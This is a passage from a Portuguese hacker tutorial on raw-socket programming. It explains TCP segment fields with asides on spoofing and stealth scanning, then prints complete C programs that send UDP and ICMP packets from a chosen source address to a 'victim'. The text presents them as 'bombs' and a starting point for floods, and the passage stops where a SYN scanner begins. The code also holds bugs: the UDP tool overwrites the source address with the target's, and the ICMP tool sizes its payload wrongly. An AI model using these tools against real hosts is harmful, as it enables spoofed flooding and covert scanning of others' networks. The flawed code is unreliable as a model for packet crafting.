+   o TCP nao for capaz de estabelecer uma conexao, ele relata a falha 
+   atraves da primitiva "Open Failure".Caso contrario, ele informa o
+   sucesso atraves da primitiva "Open Sucess", tanto para a "Active Open"
+   quanto para a "Passive Open".
+
+Apos o estabelecimento da conexao entre dois sockets, eh iniciada a
+"transferencia de dados" entre os dois usuarios TCP.Esse servico eh visto
+como um servico de "stream" de dados.Na pratica, dados sao transferidos
+pelo usuario ao TCP em blocos e pelo TCP ao destino tambem em blocos,cujo
+tamanho eh variavel e nao tem necessariamente nenhuma relacao com o
+tamanho do segmento nem com o tamanho do bloco gerado originalmente pelo
+usuario emissor.
+Um usuario envia dados atraves da primitiva "Send".Atraves dela,blocos de
+dados sao entregues ao TCP, que os coloca em um "buffer".Se o "flag push"
+estiver ligado quando da entrega de um determinado bloco, todos os dados
+do "buffer" sao imediatamente enviados em um ou mais segmentos.Caso
+contrario, o TCP pode acumular os dados no "buffer" e envia-los quando
+for conveniente, com o objetivo, por exemplo, de transferir segmentos
+maiores garantindo mais eficiencia de transmissao.
+Da mesma maneira, os dados que chegam atraves da conexao sao armazenados
+em um "buffer" a ela associado.Se os dados estiverem marcados com um
+"flag push", todos os dados do buffer sao imediatamente entregues ao
+usuario atraves de uma primitiva "Deliver".Se nao estiverem marcados,o
+TCP entrega os dados de acordo com a sua conveniencia, tentando, por
+exemplo, minimizar as interrupcoes do sistema e as interacoes ocorridas
+com as aplicacoes. A efetivacao da entrega dos dados eh dependente da
+implementacao.A primitiva "Deliver" apenas sinaliza que chegaram dados,
+cabendo ao usuario a responsabilidade de processa-los antes que o TCP
+libere o buffer.
+Aos dados tambem pode ser associado um "flag urgent" existente na
+primitiva "Send".Neste caso, o usuario de destino recebe um indicador
+"urgent" junto com os dados, sendo sua responsabilidade processa-los tao
+rapido quanto possivel.
+Finalmente, no que se refere a transferencia de dados, a primitiva 
+"Allocate" eh utilizada por um usuario TCP para informar o TCP sobre
+a quantidade de octetos que ele espera receber.
+Um usuario TCP pode "encerrar uma conexao" de duas maneiras: usando a
+primitiva "Close" ou a primitiva "Abort".A primitiva "Close" solicita que
+a conexao seja fechada de forma normal e indica que o usuario completou a
+transferencia de dados.Portanto, essa primitiva, que implicitamente obriga
+a execucao da funcao "push", dispara a seguinte sequencia de eventos:
+
+* o TCP local(onde foi emitido o Close) transmite todos os dados do buffer
+  e sinaliza ao TCP remoto que estah fechando a conexao;
+
+* o TCP remoto entrega todos os dados disponiveis ao seu usuario e o
+  informa do pedido de "Close" remoto atraves de uma primitiva de 
+  encerramento(Closing);
+
+* o usuario remoto pode enviar os dados pendentes e, entao, emitir uma
+  primitiva de "Close";
+
+* o TCP remoto transmite os dados pendentes e sinaliza ao outro TCP que
+  estah pronto para encerrar a conexao;
+
+* o TCP local entrega todos os dados pendentes ao usuario local e emite
+  uma primitiva de "Terminate". Ele tambem sinaliza ao TCP remoto que
+  encerrou a conexao;
+
+* o TCP remoto emite uma primitiva "Terminate" ao seu usuario.
+
+Dessa maneira, apos a emissao de uma primitiva "Close", o usuario TCP eh
+obrigado a continuar recebendo dados pela conexao ateh que o TCP remoto
+termine de enviar os seus dados e tambem decida encerrar a conexao.
+Um usuario tambem pode encerrar uma conexao de forma abrupta emitindo a
+primitiva "Abort". O usuario nao aceita mais dados pela conexao e, 
+portanto, dados em transito podem ser perdidos.O TCP local sinaliza ao
+TCP remoto que a conexao foi abordada; o TCP remoto, por sua vez, informa
+seu usuario a respeito disso atraves da primitiva "Terminate". Uma conexao
+TCP tambem pode ser abordada pelo proprio TCP, se ele nao for capaz de
+manter a conexao por algum motivo.Nesse caso, ele emite a primitiva
+"Terminate".
+
+O "status" da conexao e o "relatorio de erros" sao fornecidos atrves das
+primitivas de "Status" e "Error", respectivamente.O usuario solicita o
+"status" da conexao e o TCP fornece a informacao atraves da primitiva
+"Status Response".A primitiva "Error" informa ao usuario do TCP sobre os
+pedidos ilegais de servicos relativos a conexao ou sobre os erros
+relacionados ao ambiente, isto eh, os erros que afetam as estacoes
+envolvidas na conexao.
+
+	
+4.4.4 - Formato de Segmentos
+-------------------------------
+
+A unidade de transferencia de dados trocada entre estacoes usando o
+protocolo TCP eh chamada de "segmento".Segmentos sao trocados para
+estabelecimento de conexao, para transferencia de dados, para enviar ACK,
+para alterar o tamanho de janela e para encerrar uma conexao.O formato de
+um segmento eh descrito abaixo:
+
+ 0	 4	    10		16 		   24		     31
+ -----------------------------------------------------------------------
+|	porta de origem	         |	    porta de destino		|
+ -----------------------------------------------------------------------
+|		         numero de sequencia				|
+ -----------------------------------------------------------------------
+|			   numero de ACK				|
+ -----------------------------------------------------------------------
+| HLEN |reservado| bits de codigo|		janela			|
+ -----------------------------------------------------------------------
+|	   checksum		 |	     urgent pointer		|
+ -----------------------------------------------------------------------
+|		    opcoes		     |         padding		|
+ -----------------------------------------------------------------------
+|				DATA					|
+ -----------------------------------------------------------------------
+|				 ...					|
+ -----------------------------------------------------------------------
+
+Veremos o que significa cada campo mostrado acima:
+
++ porta de origem -> Numero da porta local.
+
++ porta de destino -> Eh o numero da porta aonde voce quer se conectar.
+		      Lembrando que para cada numero de porta, existe
+		      um servico TCP associado a ela.
+
++ numero de sequencia -> O campo numero de sequencia (sequence number)
+			 identifica o numero de sequencia do primeiro
+			 octeto deste segmento dentro do stream como um
+			 todo.Isso aqui eh importante para ataques "blind
+			 spoof".
+
++ numero de ACK -> (acknowledgment number) identifica o numero do proximo
+		   octeto que a origem espera receber.(Outra part
+		   importante para ataques "blind spoof").Vale notar que o
+		   "numero de sequencia" refere-se ao stream seguindo na
+		   mesma direcao do segmento(equivalente ao numero de
+		   sequencia de transmissao),enquanto o numero de ACK
+		   refere-se ao stream seguindo em direcao oposta a do
+		   segmento(equivalente ao numero de sequencia de
+		   recepcao).
+
++ HLEN -> (Header Lenght) contem um inteiro que especifica o tamanho do
+	  cabecalho do segmento medido em multiplos de 32 bits.Isto eh
+	  necessario pois o campo "opcoes" possui tamanho variavel, 
+	  dependendo de quais opcoes estao incluidas.Desse modo o tamanho
+	  do cabecalho TCP varia conforme as opcoes selecionadas.
+
++ reservado -> (reserved).Eh um campo de 6 bits que eh marcado como
+	       reservado e deixado para uso futuro.
+
++ bits de codigo -> Alguns segmentos carregam somente ACK, enquanto outros
+		    carregam dados ou solicitacoes para estabelecer ou
+		    encerrar uma conexao.O TCP utiliza um campo de 6 bits
+		    chamado bits de codigo(code bits) para determinar o
+		    proposito e o conteudo do segmento.Os seis bits mostram
+		    como interpretar os outros campos no cabecalho de
+		    acordo com o esquema abaixo:
+
+ -----------------------------------------------------------------------
+| Bit(da esquerda p/ direita)  |  Significado - se o bit estiver ligado |
+ -----------------------------------------------------------------------
+|	     URG 	       |  Campo "urgent pointer" eh valido.     |
+ -----------------------------------------------------------------------
+|	     ACK	       |  Campo "numero de ACK" eh valido.	|
+ -----------------------------------------------------------------------
+|	     PSH	       |  Este segmento solicita um "push".     |
+ -----------------------------------------------------------------------
+|	     RST	       | Ocorre uma reinicializacao de conexao. |
+ -----------------------------------------------------------------------
+|	     SYN	       | Sincroniza os numeros de sequencia.	|
+ -----------------------------------------------------------------------
+|	     FIN	       |O transmissor deseja terminar a conexao.|
+ -----------------------------------------------------------------------
+
+OBS: Se liga bem nesses conceitos sobre esses bits, porque eles sao muito
+     usados em tecnicas de portscanners mais avancadas, e alguns possuem
+     particularidades bastante uteis em determinados sistemas operacionais.
+     Exemplo: Recentemente descobriram utilidades significativas dos bits
+     PSH e URG em sistemas BSD(Free BSD).
+
+
++ janela -> (Window).O TCP informa quantos dados ele estah pronto para
+	    aceitar a cada momento que envia um segmento, atraves da
+	    especificacao do tamanho de seu "buffer" neste campo(janela).
+
++ checksum -> Eh a soma verificadora.Este campo eh baseado na soma em 
+	      complemento de um pseudo-cabecalho, do cabecalho do TCP e
+	      dos dados.Este pseudo-cabecalho eh constituido dos enderecos
+	      IP de origem e destino(olha o ip spoof aih mano), a
+	      identificacao do protocolo(no caso TCP) e do comprimento do
+	      segmento TCP.Este pseudo-cabecalho nao eh transmitido com o
+	      segmento e eh somente usado para efeitos de calculos do
+	      checksum.A utilizacao do checksum tem como objetivo detectar
+	      erros no roteamento de segmento.O UDP utiliza este mesmo
+	      artificio(Veja item 3.1).
+
++ urgent pointer -> Este campo eh usado para idetificar um bloco de dados
+		    urgentes dentro de um segmento TCP.
+
++ opcoes -> (options).Nem todos os segmentos enviados atraves de uma
+	    conexao sao do mesmo tamanho.Porem, as duas estacoes conectadas
+	    precisam estar de acordo sobre o tamanho maximo dos segmentos
+	    a serem transferidos atraves da conexao.O TCP utiliza o campo
+	    "options" para negociar, com o TCP na outra ponta da conexao,
+	    o tamanho maximo do segmento(MSS - Maximum Size Segment) que
+	    o outro estah disposto a receber.Isto eh especialmente 
+	    importante para estacoes conectadas atraves de redes locais
+	    de alta velocidade, tornando possivel escolher um tamanho
+	    maximo de segmento de modo a fazer uso adequado da banda de
+	    transmissao.Como consequencia, se as duas estacoes estiverem
+	    fisicamente na mesma rede, o TCP determina o tamanho maximo
+	    de segmentos tal que o datagrama IP resultante seja igual a
+	    MTU(Maximum Transmission Unit) da rede.Se as duas estacoes 
+	    nao se encontrarem sobre a mesma rede fisica, a especificacao
+	    atual do TCP sugere utilizar um segmento maximo de 536 octetos,	    
+	    que corresponde ao tamanho predefino(default) de um datagrama
+	    IP(576), descontados o tamanho padrao dos cabecalhos IP e TCP.
+
++ padding -> Eh usado para garantir que o tamanho do cabecalho do segmento
+	     TCP seja multiplo de 32 bits.
+
+Bom, aih estah amigo.Existe muito mais coisas sobre este protocolo, mas
+se eu fosse fazer um tutorial explicando tudo sobre isso, levaria minha
+vida toda escrevendo.Existem diversos tutoriais sobre TCP/IP na internet,
+mas a grande maioria se resume a coisas mais basicas do que as descritas
+aqui.Se voce nao sabe como ocorrem as transferencias de dados, o que eh um
+"hand-shake", essas coisas, procure um tutorial mais basico, certamente
+voce encontrarah, ou mesmo no RFC761,disponibilizo no final links para
+voce achar os RFCs.
+
+-------------------------------------
+5. PROGRAMACAO BASICA DE SOCKETS RAW |
+-------------------------------------
+
+A tao aguardada hora chegou.Tentarei da melhor forma possivel descrever a
+escrita de programas usando este tipo de socket, lembrando novamente, 
+que eh para Newbie que escrevo, logo, me limitarei a escrever somente o 
+basico do basico sobre isto.
+Raw Sockets dao maior poder ao fucador ao construir programas que enviam
+determinados pacotes em determinados protocolos.Podemos visualizar a
+necessidade de se aprender isto, descrevendo algumas tecnicas de
+portscanners "stealphs".Algumas delas como o finscan e o synscan(half-open),
+se utilizam de Raw Socks para poderem ser implementadas.Por Exemplo, a
+limitacao do uso de TCP Socks eh consideravel quando nao se quer usar
+connect(), como vimos no tutorial anterior, o portscan que disponibilizo
+naquele tutorial nao eh "seguro", pois eh facil logar.Diferente daquele,
+o finscan(que se utiliza do bit FIN do protocolo tcp) e o synscan(que
+se utiliza do bit SYN do tcp) sao tecnicas melhores, porem tambem possuem
+suas limitacoes.Este eh apenas um dos inumeros exemplos que posso citar
+para demonstrar a "necessidade" do aprendizado de programacao de RAW SOCK.
+Programacao de RAW Sockets consiste basicamente em manipularmos dados no
+cabecalho do datagrama do protocolo.Vimos a forma dos datagramas dos
+protocolos acima, irei descrever como poderemos manipular de forma simples
+e basica estes cabecalhos para enviarmos pacotes com determinados intuitos.
+
+5.1 - Declarando o Socket
+----------------------------
+
+Soh para recordar, a forma usada para declarar um arquivo socket eh uma
+soh, no caso de Raw Socket, a unica diferenca entre Stream Socket eh 
+justamente alterarmos o tipo de socket que iremos usar.Vejamos abaixo
+a declaracao de um socket do tipo RAW.
+
+main(){
+int MeuSocket;
+...
+MeuSocket = socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
+...
+}
+
+Podemos ver que a unica coisa nova eh o tipo de socket,"SOCK_RAW".
+IPPROTO_TCP indica o protocolo que iremos usar, nesse exemplo foi
+TCP, mas poderiamos colocar o numero referente a esse protocolo sem
+problemas, podemos ver o numero deste e de outros protocolos em 
+/etc/protocols, o numero do protocolo tcp eh 6.
+
+
+5.2 - Funcoes de Envio e Recebimento
+----------------------------------------
+
+As funcoes de envio e recebimento de dados usando Raw Sockets sao as
+mesmas do protocolo UDP descritas acima, sendto() para enviar e
+recvfrom() para receber.De uma olhada na parte de UDP Socks caso
+necessite, ou confira nas man pages de cada funcao.
+
+5.3 - Checksum
+-----------------
+
+Vimos na parte sobre protocolos acima, que cada datagrama desses protocolos
+descritos, necessitam de uma "soma verificadora" para checar se os pacotes
+estao chegando direito.O nome dado a esta soma eh "checksum", e quando
+estamos usando RAW Sockets necessitamos incluir um algoritmo que executarah
+esta soma verificadora para a gente.Existem alguns tipos de algoritmos jah
+amplamente divulgados na internet para executarem esta tarefa, alguns
+muito optimizados, de modo que na maioria das vezes, voce nao precisarah
+se preocupar muito com o algoritmo de checksum, bastando apenas incluir
+um desses, mas como citado "na maioria da vezes", existem excecoes..:).
+Abaixo segue um destes algoritmos:
+
+/*
+ * in_cksum --
+ *  Rotina de Checksum para familia de headers para
+ *  o protocolo Internet (Versao C)
+ */
+unsigned short in_cksum(unsigned short *addr,int len)
+{
+        register int sum = 0;
+        u_short answer = 0;
+        register u_short *w = addr;
+        register int nleft = len;
+
+ /*
+  * Our algorithm is simple, using a 32 bit accumulator (sum), we add
+  * sequential 16 bit words to it, and at the end, fold back all the
+  * carry bits from the top 16 bits into the lower 16 bits.
+  */
+
+while (nleft > 1)  {
+                sum += *w++;
+                nleft -= 2;
+        }
+
+       /* mop up an odd byte, if necessary */
+if (nleft == 1) {
+                *(u_char *)(&answer) = *(u_char *)w ;
+                sum += answer;
+        }
+        /* add back carry outs from top 16 bits to low 16 bits */
+
+        sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
+        sum += (sum >> 16);                     /* add carry */
+        answer = ~sum;                          /* truncate to 16 bits */
+        return(answer);
+}
+
+
+Como podemos notar, esse algoritmo eh logica pura! Mas seu funcionamento
+eh perfeito.Creio que este eh o melhor esquema na atualidade de checksum
+para uso em C, caso nao seja, please, me diga que quero saber..:)
+Existem varios algoritmos e quase todos sao parecidos, escolha um e
+mande brasa mano.O que eh importante na escrita de Raw Sockets eh saber
+o que esses checksum fazem, isso foi descrito na parte de protocolos acima.
+
+5.4. Estruturas Pre-Definidas de Protocolos
+--------------------------------------------
+
+Neste tutorial iremos abordar a escrita de programas com uso de RAW Socks,
+usando as estruturas jah pre-definidas em C para Linux.Estas estruturas
+facilitam na escrita dos nossos cabecalhos de datagramas.Algumas dessas
+estruturas nos podemos encontrar dentro do diretorio /usr/include/netinet.
+Elas geralmente sao inseridas atraves de headers nos codigos-fontes.
+Vejamos um Exemplo:
+
+/* Header que possui a struct udphdr */
+
+#include <netinet/udp.h>
+
+/* Pedaco do header udp.h que declara a estrutura udphdr */
+
+struct udphdr {
+  u_int16_t     source;
+  u_int16_t     dest;
+  u_int16_t     len;
+  u_int16_t     check;
+};
+
+Esse exemplo acima, serve para nos mostrar, que para manipularmos os
+cabecalhos dos datagramas dos protocolos, podemos usar estes headers e
+suas estruturas jah declaradas nele.Mais a frente veremos como declarar
+pseudo-headers para nao necessitarmos dessas estruturas pre-definidas.
+Vejamos abaixo outro exemplo de estrutura jah pre-definida para uso em
+RAW Socks, a estrutura muito usada em datagramas IP:
+
+/* Header que possui a struct iphdr */
+
+#include <netinet/ip.h>
+
+/* Pedaco do header ip.h que declara a estrutura iphdr */
+
+struct iphdr
+  {
+#if __BYTE_ORDER == __LITTLE_ENDIAN
+    unsigned int ihl:4;
+    unsigned int version:4;
+#elif __BYTE_ORDER == __BIG_ENDIAN
+    unsigned int version:4;
+    unsigned int ihl:4;
+#else
+# error "Please fix <bits/endian.h>"
+#endif
+    u_int8_t tos;
+    u_int16_t tot_len;
+    u_int16_t id;
+    u_int16_t frag_off;
+    u_int8_t ttl;
+    u_int8_t protocol;
+    u_int16_t check;
+    u_int32_t saddr;
+    u_int32_t daddr;
+    /*The options start here. */
+  };
+
+
+Aih esta.Soh olhando voce jah consegue contemplar os campos do datagrama
+IP declarados nessa estrutura.Vou rapidamente traduzir para voce os campos
+descritos nessa estrutura:
+
+ihl = Internet Header Length - comprimento do cabecalho.
+version = versao.
+
+tos = tipo de servico;
+tot_len = tamanho total;
+id = identificacao;
+frag_off = offset de fragmento;
+ttl = tempo de vida;
+protocol = protocolo;
+check = checksum do cabecalho;
+saddr= endereco de origem;
+daddr = endereco de destino;
+
+Se voce viu o formato dos datagramas IP que descrevi acima na parte de
+Protocolos, certamente entenderah o porque dessa estrutura possuir esses
+campos.
+
+Essas estruturas pre-definidas facilitam e muito a vida do programador
+de RAW Socks, mas para um fucador isto nao basta.Logo logo voce verah
+pq nao basta, mas por enquanto, vamos analizar o programa abaixo:
+
+----------------------------- envia_udp.c -----------------------------
+
+/* Simples programa exemplo de envio de um pacote UDP.
+   Desenvolvido por Nash Leon. nashleon@yahoo.com.br.
+   Thanks Unsekurity Team.
+   http://unsekurity.virtualave.net/
+*/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+
+#define  TAM_UDPHDR   sizeof(struct udphdr)
+#define  TAM_IPHDR    sizeof(struct iphdr)
+#define  ERRO         -1
+#define  PORTA        1024
+#define  NUM_PAC      50
+
+unsigned short in_cksum(u_short *addr, int len);
+void udp_send(int Meusocket, unsigned long end_origem,unsigned long
+       end_destino,unsigned short porta_orig, unsigned short porta_dest,
+       char *datagrama, unsigned datasize);
+
+main(int argc, char *argv[]){
+char *data = "A ULTIMA QUIMERA ESTAH NO FIM!",datagrama[50];
+int Meusocket, i;
+int porta, num_pacotes;
+struct sockaddr_in vitima;
+struct sockaddr_in hacker;
+unsigned long ip_origem, ip_destino;
+unsigned long end_origem, end_destino;
+unsigned short porta_origem, porta_destino;
+
+if(argc < 3){
+system("clear");
+printf("Programa para enviar pacotes udp para uma determinada porta!\n");
+printf("Desenvolvido por Nash Leon e Unsekurity Team!\n");
+printf("http://unsekurity.virtualave.net/\n\n");
+printf("Uso: %s <ip_origem> <ip_vitima> <porta> <num_pacotes>\n",argv[0]);
+exit(0);
+}
+if(getuid() != 0){
+printf("Voce necessita ser root para este exemplo mano!!\n");
+printf("Eh porque utilizo um Socket RAW, altere o fonte caso
+necessite!\n");
+exit(0);
+}
+if(argc == 3){
+ip_origem = inet_addr(argv[1]);
+ip_destino = inet_addr(argv[2]);
+porta = PORTA;
+num_pacotes = NUM_PAC;
+}
+if(argc == 4){
+ip_origem = inet_addr(argv[1]);
+ip_destino = inet_addr(argv[2]);
+porta = atoi (argv[3]);
+num_pacotes = NUM_PAC;
+}
+if(argc == 5){
+ip_origem = inet_addr(argv[1]);
+ip_destino = inet_addr(argv[2]);
+porta = atoi (argv[3]);
+num_pacotes = atoi(argv[4]);
+}
+Meusocket = socket(AF_INET,SOCK_RAW,17);
+if(Meusocket < 0){
+fprintf(stderr,"Erro em socket() mano!!\n");
+exit(ERRO);
+}
+bzero(&(vitima.sin_zero), 8);
+vitima.sin_family = AF_INET;
+vitima.sin_port = htons(porta);
+vitima.sin_addr.s_addr = ip_destino;
+
+/* Coloquei toda a estrutura local para que nao haja duvidas */
+bzero(&(hacker.sin_zero), 8);
+hacker.sin_family = AF_INET;
+hacker.sin_port = htons (0);
+hacker.sin_addr.s_addr = ip_destino;
+
+end_origem = hacker.sin_addr.s_addr;
+end_destino = vitima.sin_addr.s_addr;
+porta_origem = hacker.sin_port;
+porta_destino = vitima.sin_port;
+strcpy(datagrama,data);
+printf("Mandando bombas!!!\n");
+for (i = 0; i < num_pacotes; i++) {
+putchar('.');
+udp_send(Meusocket,end_origem,end_destino,porta_origem,porta_destino,datagrama,sizeof(datagrama));
+putchar('X');
+}
+close(Meusocket);
+printf("\nPrograma Executado com Sucesso!!\n");
+printf("Aprenda a escrever programa fucador em:\n");
+printf("http://unsekurity.virtualave.net/\n\n");
+return 0;
+}
+
+/* Checksum */
+
+unsigned short in_cksum(unsigned short *addr,int len)
+{
+        register int sum = 0;
+        u_short answer = 0;
+        register u_short *w = addr;
+        register int nleft = len;
+while (nleft > 1)  {
+                sum += *w++;
+                nleft -= 2;
+        }
+
+if (nleft == 1) {
+                *(u_char *)(&answer) = *(u_char *)w ;
+                sum += answer;
+        }
+        sum = (sum >> 16) + (sum & 0xffff);
+        sum += (sum >> 16);
+        answer = ~sum;
+        return(answer);
+}
+
+/* Envia um Pacote UDP */
+
+void udp_send(int Meusocket, unsigned long end_origem,unsigned long end_destino,
+unsigned short porta_orig, unsigned short porta_dest,char *datagrama,unsigned datasize)
+{
+struct   sockaddr_in vitima;
+/* Declaracao das estruturas para manipular o envio de pacotes udp */
+struct   udphdr      *udp;
+struct   iphdr       *ip;
+unsigned char        *data;
+unsigned char        pacote[1024];
+int manda;
+
+ip     = (struct iphdr     *)pacote;
+udp    = (struct udphdr    *)(pacote+TAM_IPHDR);
+data   = (unsigned char    *)(pacote+TAM_IPHDR+TAM_UDPHDR);
+memset(pacote, 0, 1024);
+
+udp->source  = htons(porta_orig);
+udp->dest    = htons(porta_dest);
+udp->len     = htons(TAM_UDPHDR+datasize);
+memcpy(data, datagrama, datasize);
+
+udp->check    = 0;
+
+memcpy(data, datagrama, datasize);
+memset(pacote, 0, TAM_IPHDR);
+
+ip->saddr    = end_origem;
+ip->daddr    = end_destino;
+ip->version  = 4;
+ip->ihl      = 5;
+ip->ttl      = 245;
+ip->id       = random()%5985;
+ip->protocol = 17;
+ip->tot_len  = htons(TAM_IPHDR + TAM_UDPHDR + datasize);
+ip->check    = 0;
+ip->check    = in_cksum((char *)pacote,TAM_IPHDR);
+
+vitima.sin_family      = AF_INET;
+vitima.sin_addr.s_addr = end_destino;
+vitima.sin_port        = udp->dest;
+
+/* Funcao de envio sendto() */
+
+manda = sendto(Meusocket, pacote, TAM_IPHDR+TAM_UDPHDR+datasize, 0,
+            (struct sockaddr*)&vitima, sizeof(struct sockaddr));
+
+if (manda == ERRO) {
+   perror("sendto()");
+   exit(ERRO);
+  }
+}
+-----------------------------------------------------------------------
+
+O que este programa acima faz eh somente enviar pacotes udp para uma
+determinada porta.Talvez sirva de conceito para um programa "floodador".
+Como podemos notar, entendo os conceitos de cada protocolo, sabendo o
+formato dos datagramas, o proprio C facilita a coisa p/ nos.Abaixo segue
+outro pedaco de um header, soh que este declara a estrutura icpmhdr, para
+cabecalhos ICMP:
+
+/* Header que possui a struct icmphdr */
+
+#include <netinet/ip_icmp.h>
+
+/* Pedaco do header ip_icmp.h que declara a estrutura icmphdr */
+
+struct icmphdr
+{
+  u_int8_t type;                /* message type */
+  u_int8_t code;                /* type sub-code */
+  u_int16_t checksum;
+  union
+  {
+    struct
+    {
+      u_int16_t id;
+      u_int16_t sequence;
+    } echo;                     /* echo datagram */
+    u_int32_t   gateway;        /* gateway address */
+    struct
+    {
+      u_int16_t __unused;
+      u_int16_t mtu;
+    } frag;                     /* path mtu discovery */
+  } un;
+};
+
+Consegue visualizar todos os campos de um datagrama ICMP declarados acima?
+Vejamos entao:
+
+type = tipo;
+code = codigo;
+checksum = checksum;
+
+Se voce olhar mais abaixo nesse arquivo(/usr/include/netinet/ip_icmp.h),
+verah as declaracoes dos codigos, exemplos:
+
+#define ICMP_ECHOREPLY          0       /* Echo Reply                   */
+#define ICMP_DEST_UNREACH       3       /* Destination Unreachable      */
+#define ICMP_SOURCE_QUENCH      4       /* Source Quench                */
+#define ICMP_REDIRECT           5       /* Redirect (change route)      */
+#define ICMP_ECHO               8       /* Echo Request                 */
+
+Isso eh importantissimo em algumas atividades fucadoras.Veremos abaixo
+um programa que envia pacotes ICMP(tipo = 8).
+
+---------------------------- envia_icmp.c --------------------------------
+
+/* ENVIA UM SIMPLES PACOTE ICMP!!
+   DESENVOLVIDO POR NASH LEON VULGO CORACAODELEAO
+   PARA TUTORIAL SOBRE SOCKETS PARTE II.
+   nashleon@yahoo.com.br
+   Thanks Unsekurity Team.
+   http://unsekurity.virtualave.net/
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+
+#define     ERRO        -1
+#define     TAM_IPHDR   sizeof(struct iphdr)
+#define     TAM_ICMPHDR sizeof(struct icmphdr)
+#define     NUM_PAC     10
+
+main(int argc, char *argv[]){
+char *datagrama = "Sinto muito my friend!!"; /* Altera isto, bote em hexa
+*/
+char *alvo, *hosthack;
+int i, Meusocket,num_pac, id, seq;
+struct sockaddr_in  vitima;
+struct sockaddr_in hacker;
+unsigned long int origem;
+unsigned long int destino;
+
+if(argc < 3){
+printf("Programa para envio de pacotes icmp!\n");
+printf("Desenvolvido por Nash Leon!!\n");
+printf("Uso: %s <ip_origem> <ip_alvo> <num_pacotes>\n\n",argv[0]);
+exit(0);
+}
+if(argc == 3){
+hosthack = argv[1];
+alvo = argv[2];
+num_pac = NUM_PAC;
+}
+if(argc == 4){
+hosthack = argv[1];
+alvo = argv[2];
+num_pac = atoi(argv[3]);
+}
+Meusocket = socket(AF_INET,SOCK_RAW,1);
+if(Meusocket < 0){
+fprintf(stderr,"Erro em socket() mano!!\n");
+exit(ERRO);
+}
+vitima.sin_family = AF_INET;
+vitima.sin_addr.s_addr = inet_addr(alvo);
+bzero(&(vitima.sin_zero), 8);
+
+hacker.sin_family = AF_INET;
+hacker.sin_addr.s_addr = inet_addr(hosthack);
+bzero(&(hacker.sin_zero),8);
+
+origem = hacker.sin_addr.s_addr;
+destino = vitima.sin_addr.s_addr;
+id = 0;
+seq = 0;
+
+for(i = 0; i < num_pac; i++){
+icmp_echo(Meusocket, origem, destino, id, seq,datagrama,sizeof(datagrama));
+printf(".");
+}
+printf("\nPacotes Enviados com sucesso!!\n");
+return 0;
+}
+
+/* Checksum */
+unsigned short in_cksum(addr, len)
+    u_short *addr;
+    int len;
+{
+    register int nleft  = len;
+    register u_short *w = addr;
+    register int sum    = 0;
+    u_short answer      = 0;
+
+    while (nleft > 1)  {
+        sum   += *w++;
+        nleft -= 2;
+    }
+
+    if (nleft == 1) {
+        *(u_char *)(&answer) = *(u_char *)w ;
+        sum += answer;
+    }
+
+    sum    = (sum >> 16) + (sum & 0xffff);
+    sum   += (sum >> 16);
+    answer = ~sum;
+    return(answer);
+}
+
+icmp_echo(int Meusocket, unsigned long int origem, unsigned long int
+         destino, int id, int seq, char *data, unsigned int datasize)
+{
+  unsigned char        *pacote;
+  unsigned char        *icmpdata;
+  struct   iphdr       *ip;
+  struct   icmphdr     *icmp;
+  struct   sockaddr_in vitima;
+  int N;
+
+  pacote = (char *)malloc(TAM_IPHDR + TAM_ICMPHDR + datasize + 1);
+  if (pacote == NULL) {
+        perror("malloc");
+        exit(ERRO);
+  }
+  ip       = (struct iphdr   *)pacote;
+  icmp     = (struct icmphdr *)(pacote + TAM_IPHDR);
+  icmpdata = (char           *)(pacote + TAM_IPHDR + TAM_ICMPHDR);
+
+  ip->saddr              =  origem;
+  ip->daddr              =  destino;
+  ip->version            =  4;
+  ip->ihl                =  5;
+  ip->ttl                =  255;
+  ip->protocol           =  1;
+  ip->tot_len            =  htons(TAM_IPHDR + TAM_ICMPHDR + datasize);
+  ip->tos                =  0;
+  ip->id                 =  0;
+  ip->frag_off           =  0;
+  ip->check              =  0;
+  ip->check              =  in_cksum(ip, TAM_IPHDR);
+
+  icmp->type             =  8;
+  icmp->code             =  0;
+  icmp->checksum         =  0;
+  icmp->un.echo.id       =  id;
+  icmp->un.echo.sequence =  seq;
+
+  memcpy(icmpdata, data, datasize);
+
+  icmp->checksum          = in_cksum(icmp, TAM_ICMPHDR + datasize);
+
+  vitima.sin_addr.s_addr = ip->daddr;
+  vitima.sin_family      = AF_INET;
+
+  N = sendto(Meusocket, pacote, TAM_IPHDR + TAM_ICMPHDR + datasize, 0,
+            (struct sockaddr*)&vitima, sizeof(struct sockaddr));
+  if (N == ERRO) {
+                perror("sendto()");
+                free(pacote);
+                exit(ERRO);
+  }
+  free(pacote);
+}
+
+-------------------------------------------------------------------------
+
+Aih estah um simples exemplo.Se voce notar bem, verah que ele eh muito
+parecido com o exemplo anterior, onde enviamos pacotes UDP.Esses programas
+acima sao soh para propositos educacionais, pois sao poucas suas utilidades
+praticas, talvez um flood, nao sei.
+
+Vejamos agora a estrutura responsavel pelo protocolo TCP.Ela se encontra no
+header <netinet/tcp.h>.Vejamos como esta declarada:
+
+struct tcphdr
+  {
+    u_int16_t th_sport;         /* source port */
+    u_int16_t th_dport;         /* destination port */
+    tcp_seq th_seq;             /* sequence number */
+    tcp_seq th_ack;             /* acknowledgement number */
+#if __BYTE_ORDER == __LITTLE_ENDIAN
+    u_int8_t th_x2:4;           /* (unused) */
+    u_int8_t th_off:4;          /* data offset */
+#endif
+#if __BYTE_ORDER == __BIG_ENDIAN
+    u_int8_t th_off:4;          /* data offset */
+    u_int8_t th_x2:4;           /* (unused) */
+#endif
+    u_int8_t th_flags;
+#define TH_FIN  0x01
+#define TH_SYN  0x02
+#define TH_RST  0x04
+#define TH_PUSH 0x08
+#define TH_ACK  0x10
+#define TH_URG  0x20
+    u_int16_t th_win;           /* window */
+    u_int16_t th_sum;           /* checksum */
+    u_int16_t th_urp;           /* urgent pointer */
+};
+
+Voce pode perfeitamente visualizar os campos de um datagrama tcp acima.
+Para ilustrar um exemplo de um programa que se utiliza desta estrutura
+pre-definida, abaixo segue um syn scanner(portscan), que se utiliza do
+bit syn ligado.
+
+-----------------------------psnlsyn.0.1.c------------------------------
+
